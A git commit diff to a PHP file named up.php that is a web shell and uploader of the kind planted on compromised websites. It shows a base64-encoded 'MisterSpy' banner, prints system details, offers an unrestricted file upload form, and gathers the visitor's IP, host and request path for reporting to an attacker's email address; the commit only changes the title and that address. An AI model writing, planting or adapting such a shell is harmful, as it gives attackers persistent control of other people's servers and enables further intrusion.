d48ff95424871b5e2c510d959b4d3f852423940b
samira774 <67966296+samira774@users.noreply.github.com>
2020-12-04 23:46:19 +0600

    Update up.php

--- v4rdp/up.php
+++ v4rdp/up.php
@@ -2,14 +2,14 @@
 $str = 'TWlzdGVyU3B5U2hlbGxGb3JWN0JvdDBYX2lzdGFuYnVsXzIwMTk=';echo base64_decode($str);
 
 ?>
-<title>Vuln!! patch it Now! MisterSpyv7up</title>
+<title>Vuln!! patch it Now! m4dki773r</title>
 <?php echo 'MisterSpyv7up uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
 ?>
 <?php
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = " Bot v6 Rzlt |$ip";
-$email = "sellerolux@gmail.com";
+$email = "allhacking777@gmail.com";
 $from = "From: Result<botv3@mrspybotv3.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
